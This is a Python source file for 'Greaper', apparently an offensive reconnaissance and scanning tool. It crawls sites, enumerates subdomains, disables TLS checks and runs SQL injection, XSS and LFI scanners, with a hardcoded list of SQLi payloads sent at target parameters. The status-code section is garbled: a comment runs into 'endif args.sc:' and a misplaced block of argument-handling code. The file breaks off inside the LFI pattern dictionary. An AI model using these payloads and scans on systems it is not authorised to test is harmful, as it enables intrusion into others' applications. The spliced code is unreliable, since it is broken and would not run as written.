#!/usr/bin/env python3

# Imports
import os
import sys

# Set environment variable to ignore SSL warnings
os.environ['PYTHONWARNINGS'] = 'ignore:Unverified HTTPS request'

import pyfiglet
import random
import requests
from bs4 import BeautifulSoup
import argparse
import dns.resolver
import socket
import time
import re
import json
import subprocess
import concurrent.futures
from urllib.parse import urlparse, urljoin, parse_qs
from retrying import retry  # Added for retry mechanism with exponential backoff
import threading
from datetime import datetime
import asyncio
import aiohttp
from collections import defaultdict
import urllib3
import ssl
from ipwhois import IPWhois
from packaging import version
import html
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Multiple layers of warning suppression to ensure no SSL warnings appear
warnings.filterwarnings('ignore')
urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Monkey patch the warnings module
def ignore_warnings(*args, **kwargs):
    pass

warnings.warn = ignore_warnings

# ANSI escape codes for colors
COLOR_GREEN = "\033[92m"
COLOR_RED = "\033[91m"
COLOR_ORANGE = "\033[93m"
COLOR_PURPLE = "\033[95m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_GREY = "\033[90m"
COLOR_RESET = "\033[0m"

# List of available fonts in pyfiglet
available_fonts = pyfiglet.FigletFont.getFonts()

# List of ANSI color codes
color_codes = [31, 32, 33, 34, 35, 36, 91, 92, 93, 94, 95, 96]

# Randomly select a font and a color
font = random.choice(available_fonts)
color_code = random.choice(color_codes)

# Create ASCII art with the chosen font
ascii_art = pyfiglet.figlet_format("GREAPER", font=font, width=80)

# Apply ANSI escape codes for the chosen color
colored_ascii = f"\033[{color_code}m{ascii_art}\033[0m"

# Print the colored ASCII art
print(colored_ascii)
print(" " * 2 + "made by algorethm")

def save_results(output_file, results):
    if output_file:
        print(f"{COLOR_GREEN}[+] Results saved to {output_file}{COLOR_RESET}")

def color_status_code(status_code):
    if 200 <= status_code < 300:
        return COLOR_GREEN
    elif 300 <= status_code < 400:
        return COLOR_PURPLE
    elif 400 <= status_code < 500:
        return COLOR_BLUE
    elif 500 <= status_code < 600:
        return COLOR_RED
    return COLOR_GREY

async def fetch_urls_async(session, url, source_name):
    """Asynchronously fetch URLs from various sources"""
    try:
        timeout = aiohttp.ClientTimeout(total=20)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        async with session.get(url, timeout=timeout, headers=headers, ssl=False) as response:
            if response.status == 200:
                data = await response.text()
                return source_name, data
            return source_name, None
    except Exception:
        return source_name, None

async def fetch_all_archive_urls(domain):
    """Fetch URLs from multiple archive sources concurrently"""
    sources = {
        'wayback': f"https://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey",
        'alienvault': f"https://otx.alienvault.com/api/v1/indicators/domain/{domain}/url_list",
        'commoncrawl': f"https://index.commoncrawl.org/CC-MAIN-2023-50-index?url=*.{domain}/*&output=json"
    }
    
    connector = aiohttp.TCPConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=30)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [fetch_urls_async(session, url, source) for source, url in sources.items()]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        all_urls = set()
        for result in results:
            if isinstance(result, tuple):
                source, data = result
                if data:
                    try:
                        if source == 'wayback':
                            json_data = json.loads(data)
                            if isinstance(json_data, list) and len(json_data) > 0:
                                urls = [entry[0] for entry in json_data[1:]]
                                all_urls.update(urls)
                        elif source == 'alienvault':
                            json_data = json.loads(data)
                            if 'url_list' in json_data:
                                urls = [item['url'] for item in json_data['url_list']]
                                all_urls.update(urls)
                        elif source == 'commoncrawl':
                            urls = [json.loads(line)['url'] for line in data.splitlines() if line]
                            all_urls.update(urls)
                    except:
                        continue
        
        return all_urls

async def crawl_site_async(url, depth=1, current_depth=1, crawled_urls=None, domain=None, semaphore=None):
    """Asynchronously crawl a website with rate limiting"""
    if crawled_urls is None:
        crawled_urls = set()
    if not domain:
        domain = urlparse(url).netloc
    
    if url in crawled_urls:
        return crawled_urls

    async with semaphore:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as response:
                    if response.status != 200:
                        return crawled_urls

                    content = await response.text()
                    soup = BeautifulSoup(content, 'html.parser')
                    links = set()

                    # Enhanced tag processing with specific attributes
                    tag_attrs = {
                        'a': 'href',
                        'script': 'src',
                        'link': 'href',
                        'img': 'src',
                        'form': 'action'
                    }

                    for tag, attr in tag_attrs.items():
                        for element in soup.find_all(tag):
                            link = element.get(attr)
                            if link:
                                full_link = urljoin(url, link)
                                if full_link.startswith(('http', 'https')) and domain in full_link:
                                    links.add(full_link)

                    # Enhanced file type detection
                    interesting_files = r'\.(txt|json|js|zip|tar\.gz|sql|csv|xml|graphql|env|yml|pdf|doc|xls|config|bak|backup|old|temp|tmp|log)$'
                    for link in soup.find_all('a', href=re.compile(interesting_files, re.I)):
                        full_link = urljoin(url, link.get('href'))
                        if full_link.startswith(('http', 'https')) and domain in full_link:
                            links.add(full_link)

                    # Format and display results
                    if links:
                        print(f"\n{COLOR_BLUE}[*] URL: {url}{COLOR_RESET}")
                        print(f"{COLOR_GREEN}[+] Found {len(links)} links{COLOR_RESET}")
                        
                        # Group links by file type for better readability
                        grouped_links = defaultdict(list)
                        for link in links:
                            ext = os.path.splitext(link)[1].lower() or 'no_extension'
                            grouped_links[ext].append(link)
                        
                        for ext, ext_links in grouped_links.items():
                            print(f"\n{COLOR_PURPLE}[*] {ext.upper()} files:{COLOR_RESET}")
                            for link in sorted(ext_links):
                                print(f"    {link}")
                    
                    crawled_urls.add(url)

                    if current_depth < depth:
                        tasks = []
                        for link in links - crawled_urls:
                            task = crawl_site_async(
                                link, 
                                depth=depth,
                                current_depth=current_depth + 1,
                                crawled_urls=crawled_urls,
                                domain=domain,
                                semaphore=semaphore
                            )
                            tasks.append(task)
                        
                        if tasks:
                            await asyncio.gather(*tasks)

        except Exception as e:
            print(f"{COLOR_ORANGE}[-] Error crawling {url}: {str(e)}{COLOR_RESET}")

    return crawled_urls

async def enhanced_crawl_async(url, depth=1):
    """Enhanced crawler with concurrent archive fetching and site crawling"""
    domain = urlparse(url).netloc
    
    # Fetch archive URLs concurrently
    archive_urls = await fetch_all_archive_urls(domain)
    
    # Initialize crawled URLs with archive URLs
    crawled_urls = set(archive_urls)

    # Create a semaphore for rate limiting
    semaphore = asyncio.Semaphore(10)

    # Perform the main crawl
    await crawl_site_async(url, depth=depth, crawled_urls=crawled_urls, domain=domain, semaphore=semaphore)

    return crawled_urls

def enhanced_crawl(url, depth=1, crawled_urls=set(), domain=None, output_file=None, is_first=True, start_time=None):
    """Synchronous wrapper for the async crawler"""
    # Only show start message for the first URL
    if is_first:
        if start_time is None:
            start_time = datetime.now()
        print(f"\n{COLOR_BLUE}[*] Starting Greaper crawler at {start_time.strftime('%H:%M:%S')}{COLOR_RESET}")
    
    # Create new event loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        crawled_urls = loop.run_until_complete(enhanced_crawl_async(url, depth))
        
        # Print URLs as they're found
        for found_url in sorted(crawled_urls):
            print(f"    {found_url}")
            
        # Save results if output file specified
        if output_file:
            with open(output_file, 'a', encoding='utf-8') as f:
                for found_url in sorted(crawled_urls):
                    f.write(f"{found_url}\n")
        
        return crawled_urls
    
    except Exception as e:
        if str(e):  # Only print error if there's an actual message
            print(f"{COLOR_RED}[-] Error crawling {url}: {str(e)}{COLOR_RESET}")
        return set()
    
    finally:
        loop.close()

def get_content_length(url, output_file=None):
    """Get content length for a URL"""
    # Print header and start timer only for the first URL
    if not hasattr(get_content_length, 'header_printed'):
        print(f"\n{COLOR_BLUE}[*] Greaper Content Length Checker{COLOR_RESET}\n")
        get_content_length.header_printed = True
        get_content_length.start_time = time.time()

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.get(url, timeout=10, headers=headers, allow_redirects=True)
        content_length = response.headers.get('Content-Length')
        actual_size = len(response.content)
        
        # Always display size in bytes
        size = int(content_length) if content_length else actual_size
        
        # Format for terminal output
        terminal_output = f"{COLOR_GREEN}{url} [{size}b]{COLOR_RESET}"
        # Format for file output
        file_output = f"{url} [{size}b]"
        
        print(terminal_output)
        
        if output_file:
            with open(output_file, 'a') as f:
                f.write(file_output + '\n')
        
        return True

    except requests.RequestException:
        return False

def process_urls_for_content_length(urls, output_file=None):
    """Process multiple URLs and show total time at the end"""
    for url in urls:
        get_content_length(url, output_file)
    
    # Print total time elapsed at the very end
    if hasattr(get_content_length, 'start_time'):
        elapsed_time = time.time() - get_content_length.start_time
        print(f"\n{COLOR_BLUE}[*] Total time elapsed: {elapsed_time:.2f} seconds{COLOR_RESET}")

def check_live_urls(url, output_file=None):
    """Check if URLs are live and responding to different protocols"""
    # Initialize start time only once
    if not hasattr(check_live_urls, 'header_printed'):
        print(f"\n{COLOR_BLUE}[*] Starting Greaper HTTP probing{COLOR_RESET}\n")
        check_live_urls.header_printed = True
        check_live_urls.start_time = time.time()
        # Suppress SSL warnings
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    results = []
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    for protocol in ['https://', 'http://', 'ftp://']:
        try:
            full_url = protocol + url.strip('/')
            response = requests.get(full_url, timeout=3, headers=headers, verify=False, allow_redirects=True)
            
            if 200 <= response.status_code < 400:
                result = f"{COLOR_GREEN}{full_url}{COLOR_RESET}"
                print(result)
                # Store result without color codes for file output
                if output_file:
                    results.append(full_url)
                break  # Stop checking other protocols if one succeeds
                
        except:
            continue

    # Save results to file if specified
    if output_file and results:
        with open(output_file, 'a') as f:
            for result in results:
                f.write(result + '\n')

    # Show elapsed time only for the last URL
    if hasattr(check_live_urls, 'start_time') and url == check_live_urls.last_url:
        elapsed_time = time.time() - check_live_urls.start_time
        print(f"\n{COLOR_BLUE}[*] Total time elapsed: {elapsed_time:.2f} seconds{COLOR_RESET}")

def check_status_code(url, output_file=None):
    # Initialize start time only once
    if not hasattr(check_status_code, 'header_printed'):
        print(f"\n{COLOR_BLUE}[*] Starting Greaper Status Code checker{COLOR_RESET}\n")
        check_status_code.header_printed = True
        check_status_code.start_time = time.time()

    try:
        # Allow redirects but track them
        response = requests.get(url, timeout=5, allow_redirects=True)
        
        # Get the redirect history
        redirect_chain = response.history
        results = []
        
        # If there were redirects, show the chain
        if redirect_chain:
            # Start with the original URL
            chain = []
            for r in redirect_chain:
                color = color_status_code(r.status_code)
                redirect_result = f"{color}{r.url} [{r.status_code}]{COLOR_RESET} → "
                chain.append(redirect_result)
                # Store result without color codes for file output
                results.append(f"{r.url} [{r.status_code}] → ")
            
            # Print the chain in one line
            print(''.join(chain), end='')
            
            # Show final destination
            color = color_status_code(response.status_code)
            final_result = f"{color}{response.url} [{response.status_code}]{COLOR_RESET}"
            print(final_result)
            # Store final result without color codes
            results.append(f"{response.url} [{response.status_code}]")
        else:
            # No redirects, just show the response
            color = color_status_code(response.status_code)
            final_result = f"{color}{response.url} [{response.status_code}]{COLOR_RESET}"
            print(final_result)
            results.append(f"{response.url} [{response.status_code}]")
        
        # Save results if output file specified
        if output_file:
            with open(output_file, 'a') as f:
                f.write(''.join(results) + '\n')
            
    except requests.RequestException:
        # For connection errors, show as 503 Service Unavailable
        color = color_status_code(503)
        final_result = f"{color}{url} [503]{COLOR_RESET}"
        print(final_result)
        if output_file:
            with open(output_file, 'a') as f:
                f.write(f"{url} [503]\n")

def process_urls_for_status_code(urls, output_file=None):
    """Process multiple URLs and show total time at the end"""
    # Filter out blank lines and comments
    valid_urls = [url.strip() for url in urls if url.strip() and not url.strip().startswith('#')]
    
    if not valid_urls:
        print(f"{COLOR_RED}[-] No valid URLs found to check{COLOR_RESET}")
        return
        
    for url in valid_urls:
        check_status_code(url, output_file)
    
    # Print total time elapsed at the very endif args.sc:
        results = []
        if args.url:
            result = check_status_code(args.url)
            results.extend(result)
        elif args.list:
            with open(args.list, 'r') as f:
                urls = [line.strip() for line in f]
            for url in urls:
                result = check_status_code(url)
                results.extend(result)
        if args.output:
            save_results(args.output, results, "Status Code Check")
    if hasattr(check_status_code, 'start_time'):
        elapsed_time = time.time() - check_status_code.start_time
        print(f"\n{COLOR_BLUE}[*] Total time elapsed: {elapsed_time:.2f} seconds{COLOR_RESET}")

def get_subdomains_from_crtsh(domain):
    print(f"[*] Fetching subdomains from crt.sh for {domain}")
    try:
        response = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json")
        subdomains = set()
        if response.status_code == 200:
            certs = response.json()
            for cert in certs:
                if "name_value" in cert:
                    subdomains.update(cert['name_value'].splitlines())
        return list(subdomains)
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error fetching subdomains from crt.sh: {str(e)}{COLOR_RESET}")
        return []

def get_subdomains_from_google(domain):
    print(f"[*] Fetching subdomains from Google for {domain}")
    subdomains = []
    query = f"site:{domain} -www"
    try:
        search_url = f"https://www.google.com/search?q={query}&num=100"
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(search_url, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            for a_tag in soup.find_all('a'):
                href = a_tag.get('href')
                if href and domain in href:
                    subdomain = re.search(r'https?://([a-zA-Z0-9.-]+)', href)
                    if subdomain:
                        subdomains.append(subdomain.group(1))
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error fetching subdomains from Google: {str(e)}{COLOR_RESET}")
    return subdomains

async def fetch_subdomains(session, source_url, source_name):
    """Asynchronously fetch subdomains from various sources"""
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        async with session.get(source_url, headers=headers, ssl=False) as response:
            if response.status == 200:
                return source_name, await response.text()
            return source_name, None
    except Exception as e:
        return source_name, None

def parse_domain_pattern(url):
    """Parse domain pattern and return the base domain and position for enumeration"""
    # Remove protocol if present
    domain = url.split('://')[-1].strip('/')
    
    if '*' not in domain:
        return domain, None
    
    parts = domain.split('.')
    wildcard_index = next(i for i, part in enumerate(parts) if '*' in part)
    base_domain = '.'.join(parts[wildcard_index + 1:])
    prefix = '.'.join(parts[:wildcard_index]) + '.' if wildcard_index > 0 else ''
    
    return base_domain, prefix

async def enumerate_subdomains(url=None, output_file=None, rate_limit=3):
    start_time = time.time()
    print(f"\n{COLOR_BLUE}[*] Starting Greaper Subdomain Enumeration{COLOR_RESET}\n")
    
    base_domain, prefix = parse_domain_pattern(url)
    
    # Enhanced sources dictionary with more providers
    sources = {
        'crt.sh': f"https://crt.sh/?q=%.{base_domain}&output=json",
        'alienvault': f"https://otx.alienvault.com/api/v1/indicators/domain/{base_domain}/passive_dns",
        'hackertarget': f"https://api.hackertarget.com/hostsearch/?q={base_domain}",
        'riddler': f"https://riddler.io/search/exportcsv?q=pld:{base_domain}",
        'bufferover': f"https://dns.bufferover.run/dns?q=.{base_domain}",
        'threatcrowd': f"https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={base_domain}",
        'urlscan': f"https://urlscan.io/api/v1/search/?q=domain:{base_domain}",
        'virustotal': f"https://www.virustotal.com/vtapi/v2/domain/report?apikey=<your-api-key>&domain={base_domain}",
        'securitytrails': f"https://api.securitytrails.com/v1/domain/{base_domain}/subdomains",
        'certspotter': f"https://api.certspotter.com/v1/issuances?domain={base_domain}&include_subdomains=true&expand=dns_names",
        'threatminer': f"https://api.threatminer.org/v2/domain.php?q={base_domain}&rt=5"
    }
    
    subdomains = set()  # Using set to automatically handle duplicates
    connector = aiohttp.TCPConnector(ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [fetch_subdomains(session, url, source) for source, url in sources.items()]
        results = await asyncio.gather(*tasks)
        
        for source, data in results:
            if not data:
                continue
                
            try:
                new_subdomains = set()  # Temporary set for new subdomains from each source
                
                if source == 'crt.sh':
                    json_data = json.loads(data)
                    for entry in json_data:
                        if "name_value" in entry:
                            names = entry["name_value"].split('\n')
                            new_subdomains.update(name.strip().lower() for name in names if '*' not in name)
                
                elif source == 'alienvault':
                    json_data = json.loads(data)
                    if 'passive_dns' in json_data:
                        new_subdomains.update(record['hostname'].lower() for record in json_data['passive_dns'])
                
                elif source == 'hackertarget':
                    new_subdomains.update(line.split(',')[0].lower() for line in data.splitlines())
                
                elif source == 'threatcrowd':
                    json_data = json.loads(data)
                    if 'subdomains' in json_data:
                        new_subdomains.update(sub.lower() for sub in json_data['subdomains'])
                
                elif source == 'urlscan':
                    json_data = json.loads(data)
                    if 'results' in json_data:
                        for result in json_data['results']:
                            if 'page' in result and 'domain' in result['page']:
                                new_subdomains.add(result['page']['domain'].lower())
                
                elif source == 'virustotal':
                    json_data = json.loads(data)
                    if 'subdomains' in json_data:
                        new_subdomains.update(sub.lower() for sub in json_data['subdomains'])
                
                elif source == 'securitytrails':
                    json_data = json.loads(data)
                    if 'subdomains' in json_data:
                        new_subdomains.update(f"{sub}.{base_domain}".lower() for sub in json_data['subdomains'])
                
                elif source == 'certspotter':
                    json_data = json.loads(data)
                    for cert in json_data:
                        if 'dns_names' in cert:
                            new_subdomains.update(name.lower() for name in cert['dns_names'] if base_domain in name)
                
                elif source == 'threatminer':
                    json_data = json.loads(data)
                    if json_data.get('status_code') == '200' and 'results' in json_data:
                        new_subdomains.update(sub.lower() for sub in json_data['results'])
                
                # Add new unique subdomains and print them
                for subdomain in new_subdomains - subdomains:  # Only process new subdomains
                    if prefix:
                        if subdomain.endswith(base_domain):
                            formatted = f"{prefix}{subdomain}"
                            if '*' not in formatted and '2f' not in formatted.lower():  # Filter out malformed URLs
                                subdomains.add(formatted)
                                print(formatted)
                    else:
                        if subdomain.endswith(base_domain) and '*' not in subdomain and '2f' not in subdomain.lower():
                            subdomains.add(subdomain)
                            print(subdomain)
            
            except json.JSONDecodeError:
                continue
            except Exception as e:
                continue
    
    # Sort the final list of subdomains
    sorted_subdomains = sorted(subdomains, key=lambda x: (len(x.split('.')), x))
    
    # Save results if output file specified - now in append mode with duplicate checking
    if output_file and sorted_subdomains:
        # Read existing subdomains to avoid duplicates
        existing_subdomains = set()
        try:
            with open(output_file, 'r') as f:
                existing_subdomains = {line.strip() for line in f}
        except FileNotFoundError:
            pass

        # Write new subdomains
        with open(output_file, 'a') as f:
            for subdomain in sorted_subdomains:
                if subdomain not in existing_subdomains and '2f' not in subdomain.lower():
                    f.write(f"{subdomain}\n")
                    existing_subdomains.add(subdomain)
        
        print(f"\n{COLOR_BLUE}[+] Subdomains saved to {output_file}{COLOR_RESET}")
    
    # Display time elapsed
    elapsed_time = time.time() - start_time
    print(f"{COLOR_BLUE}[*] Time elapsed: {elapsed_time:.2f} seconds{COLOR_RESET}")
    
    return sorted_subdomains

def greaper_sqli_scanner(target, payload_file=None, output_file=None, dynamic_payloads=None):
    """Enhanced SQL injection scanner with multiple detection methods"""
    print(f"\n{COLOR_BLUE}[*] Starting Greaper SQLi scan on {target}{COLOR_RESET}")
    
    # SQL error patterns for different databases
    sql_error_patterns = [
        r"sql syntax.*mysql",
        r"warning.*mysql_.*",
        r"postgresql.*error",
        r"oracle.*error",
        r"microsoft.*database.*error",
        r"warning.*sqlstate",
        r"odbc.*driver.*error",
        r"jdbc.*sqlexception",
        r"sqlite\.exception",
        r"mariadb.*error"
    ]

    # Default SQLi payloads with comments for different databases
    sqli_payloads = [
        # Error-based
        "' OR '1'='1", # Basic OR condition
        "' OR 1=1#",   # MySQL comment
        "' OR 1=1--",  # SQL Server comment
        "' OR 1=1/*",  # C-style comment
        
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        
        # Time-based
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR pg_sleep(5)--",
        
        # Boolean-based
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR 'x'='x",
        
        # Stacked queries
        "'; SELECT @@version--",
        "'; SELECT system_user()--",
        "'; SELECT current_database()--"
    ]

    # Load additional payloads from file if provided
    if payload_file:
        try:
            payload_file = os.path.expanduser(payload_file)
            if os.path.isfile(payload_file):
                with open(payload_file, 'r') as file:
                    custom_payloads = [line.strip() for line in file.readlines() if line.strip() and not line.startswith('#')]
                    sqli_payloads.extend(custom_payloads)
                    print(f"{COLOR_GREEN}[+] Loaded {len(custom_payloads)} custom payloads{COLOR_RESET}")
        except Exception as e:
            print(f"{COLOR_ORANGE}[-] Error loading payload file: {str(e)}{COLOR_RESET}")

    # Use dynamic payloads if provided
    if dynamic_payloads:
        sqli_payloads = dynamic_payloads

    results = {
        'timestamp': datetime.now().isoformat(),
        'target': target,
        'vulnerabilities': [],
        'scan_duration': 0,
        'total_payloads': len(sqli_payloads),
        'successful_payloads': []
    }

    # Helper functions - moved inside main function
    def extract_parameters(url):
        """Extract parameters from URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return {k: v[0] for k, v in params.items()}

    def analyze_response(response, original_response=None):
        indicators = {
            'error_based': any(re.search(pattern, response.text.lower()) for pattern in sql_error_patterns),
            'time_based': response.elapsed.total_seconds() > 5,
            'size_based': original_response and abs(len(response.content) - len(original_response.content)) > 100,
            'status_code': response.status_code != 200
        }
        return any(indicators.values()), indicators

    def test_boolean_sqli(url, param_name, param_value):
        """Test for boolean-based SQL injection by comparing true/false conditions"""
        try:
            # Create test URLs with true/false conditions
            true_url = url.replace(f"{param_name}={param_value}", f"{param_name}=' OR '1'='1")
            false_url = url.replace(f"{param_name}={param_value}", f"{param_name}=' AND '1'='2")
            
            true_response = requests.get(true_url, timeout=5)
            false_response = requests.get(false_url, timeout=5)
            
            return (
                abs(len(true_response.content) - len(false_response.content)) > 100,
                true_response.text != false_response.text
            )
        except:
            return False, False

    @retry(stop_max_attempt_number=3, wait_exponential_multiplier=1000)
    def make_request_with_retry(url, method='GET', data=None, timeout=5):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            if method == 'GET':
                return requests.get(url, headers=headers, timeout=timeout)
            elif method == 'POST':
                return requests.post(url, data=data, headers=headers, timeout=timeout)
            elif method == 'PUT':
                return requests.put(url, data=data, headers=headers, timeout=timeout)
        except requests.Timeout:
            print(f"{COLOR_ORANGE}[-] Request timed out, retrying...{COLOR_RESET}")
            raise
        except requests.RequestException as e:
            print(f"{COLOR_ORANGE}[-] Request error: {str(e)}{COLOR_RESET}")
            raise

    def test_parameter(url, param_name, payload, baseline_response):
        """Test a specific parameter for SQL injection vulnerabilities"""
        results = []
        
        # Get the current parameter value
        params = extract_parameters(url)
        param_value = params.get(param_name, '')
        
        # Test for boolean-based injection
        length_diff, content_diff = test_boolean_sqli(url, param_name, param_value)
        if length_diff or content_diff:
            results.append({
                'param': param_name,
                'payload': payload,
                'type': 'Boolean-based SQLi',
                'confidence': 'High' if (length_diff and content_diff) else 'Medium'
            })
        
        # Test for error-based and time-based injection
        try:
            response = make_request_with_retry(url)
            is_vulnerable, indicators = analyze_response(response, baseline_response)
            
            if is_vulnerable:
                vuln_type = 'Unknown'
                confidence = 'Medium'
                
                if indicators['error_based']:
                    vuln_type = 'Error-based SQLi'
                    confidence = 'High'
                elif indicators['time_based']:
                    vuln_type = 'Time-based SQLi'
                    confidence = 'High'
                
                results.append({
                    'param': param_name,
                    'payload': payload,
                    'type': vuln_type,
                    'confidence': confidence
                })
        except Exception as e:
            print(f"{COLOR_ORANGE}[-] Error testing parameter {param_name}: {str(e)}{COLOR_RESET}")
        
        return results

    # Get baseline response
    try:
        baseline_response = make_request_with_retry(target)
        print(f"{COLOR_BLUE}[*] Established baseline response{COLOR_RESET}")
    except:
        print(f"{COLOR_RED}[-] Could not establish baseline response{COLOR_RESET}")
        return

    # Test each parameter if URL contains parameters
    params = extract_parameters(target)
    if not params and 'FUZZ' not in target:
        print(f"{COLOR_RED}[-] No parameters found to test. Please include 'FUZZ' in URL or add parameters.{COLOR_RESET}")
        return

    found_vulnerabilities = []  # List to store successful findings
    
    for payload in sqli_payloads:
        if params:
            for param_name, param_value in params.items():
                test_url = target.replace(f"{param_name}={param_value}", f"{param_name}={payload}")
                try:
                    response = make_request_with_retry(test_url)
                    is_vulnerable, indicators = analyze_response(response, baseline_response)
                    
                    if is_vulnerable:
                        result = f"{COLOR_GREEN}[+] Potential SQLi found on {test_url} With payload: {payload}{COLOR_RESET}"
                        print(result)
                        # Store finding without color codes for file output
                        found_vulnerabilities.append(f"[+] Potential SQLi found on {test_url} With payload: {payload}")
                    else:
                        print(f"{COLOR_RED}[-] No SQLi found for payload: {payload}{COLOR_RESET}")
                    
                except Exception as e:
                    print(f"{COLOR_RED}[-] Error testing payload: {str(e)}{COLOR_RESET}")
        else:
            test_url = target.replace("FUZZ", payload)
            try:
                response = make_request_with_retry(test_url)
                is_vulnerable, indicators = analyze_response(response, baseline_response)
                
                if is_vulnerable:
                    result = f"{COLOR_GREEN}[+] Potential SQLi found on {test_url} With payload: {payload}{COLOR_RESET}"
                    print(result)
                    # Store finding without color codes for file output
                    found_vulnerabilities.append(f"[+] Potential SQLi found on {test_url} With payload: {payload}")
                else:
                    print(f"{COLOR_RED}[-] No SQLi found for payload: {payload}{COLOR_RESET}")
                
                time.sleep(0.5)  # Add small delay between requests
                
            except Exception as e:
                print(f"{COLOR_RED}[-] Error testing payload: {str(e)}{COLOR_RESET}")

    # Print final summary and handle file output
    print("\n" + "="*50)
    if found_vulnerabilities:
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write("\n".join(found_vulnerabilities))
                print(f"{COLOR_GREEN}[+] Results saved to {output_file}{COLOR_RESET}")
            except Exception as e:
                print(f"{COLOR_RED}[-] Error saving results: {str(e)}{COLOR_RESET}")
    else:
        print(f"\n{COLOR_RED}[-] No SQLi vulnerabilities found.{COLOR_RESET}")

def greaper_xss_scanner(target, payload_file, output_file=None, dynamic_payloads=None):
    """Enhanced XSS scanner with better detection mechanisms and reduced false positives"""
    # Suppress SSL warnings
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    print(f"\n{COLOR_BLUE}[*] Starting Greaper XSS scanner on {target}{COLOR_RESET}")
    payload_file = os.path.expanduser(payload_file)
    
    if not os.path.isfile(payload_file):
        print(f"{COLOR_ORANGE}[-] Payload file '{payload_file}' not found.{COLOR_RESET}")
        return
    
    try:
        with open(payload_file, 'r') as file:
            payloads = [line.strip() for line in file.readlines() if line.strip() and not line.startswith('#')]
            print(f"{COLOR_GREEN}[+] Loaded {len(payloads)} custom payloads{COLOR_RESET}\n")
    except Exception as e:
        print(f"{COLOR_ORANGE}[-] Error reading payload file: {str(e)}{COLOR_RESET}")
        return

    # Use dynamic payloads if provided
    if dynamic_payloads:
        payloads = dynamic_payloads

    found_xss = False
    results = []
    
    # Test each payload
    for payload in payloads:
        try:
            test_url = target.replace("FUZZ", requests.utils.quote(payload))
            response = requests.get(
                test_url,
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=10,
                verify=False
            )
            
            if payload in response.text:
                result = f"{COLOR_GREEN}[+] Potential XSS found on {test_url} With payload: {payload}{COLOR_RESET}"
                print(result)
                # Store result without color codes for file output
                results.append(result)
            else:
                print(f"{COLOR_RED}[-] No XSS found for payload: {payload}{COLOR_RESET}")
                
        except requests.RequestException as e:
            print(f"{COLOR_RED}[-] Error testing payload: {str(e)}{COLOR_RESET}")
            continue

    # Summary and file output
    if results:
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write('\n'.join(results))
                print(f"\n{COLOR_BLUE}[*] Results saved to {output_file}{COLOR_RESET}")
            except Exception as e:
                print(f"{COLOR_RED}[-] Error saving results: {str(e)}{COLOR_RESET}")
    else:
        print(f"\n{COLOR_RED}[-] No XSS vulnerabilities found{COLOR_RESET}")

def greaper_lfi_scanner(target, payload_file, output_file=None, dynamic_payloads=None):
    """Enhanced LFI scanner with improved detection and reduced false positives"""
    # Suppress SSL warnings
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    print(f"\n{COLOR_BLUE}[*] Starting Greaper LFI scanner on {target}{COLOR_RESET}")
    payload_file = os.path.expanduser(payload_file)

    if not os.path.isfile(payload_file):
        print(f"{COLOR_RED}[-] Payload file '{payload_file}' not found.{COLOR_RESET}")
        return

    # Load and preprocess payloads
    try:
        with open(payload_file, 'r') as file:
            payloads = [line.strip() for line in file.readlines() if line.strip() and not line.startswith('#')]
        print(f"{COLOR_GREEN}[*] Loaded {len(payloads)} custom payloads{COLOR_RESET}\n")
    except Exception as e:
        print(f"{COLOR_RED}[-] Error reading payload file: {str(e)}{COLOR_RESET}")
        return

    # Use dynamic payloads if provided
    if dynamic_payloads:
        payloads = dynamic_payloads

    # Get baseline response for comparison
    try:
        baseline_response = requests.get(
            target.replace("FUZZ", ""),
            verify=False,
            timeout=10
        )
        baseline_length = len(baseline_response.text)
        baseline_content = baseline_response.text
    except requests.RequestException as e:
        print(f"{COLOR_RED}[-] Error getting baseline response: {str(e)}{COLOR_RESET}")
        return

    # Enhanced patterns for better accuracy
    lfi_patterns = {
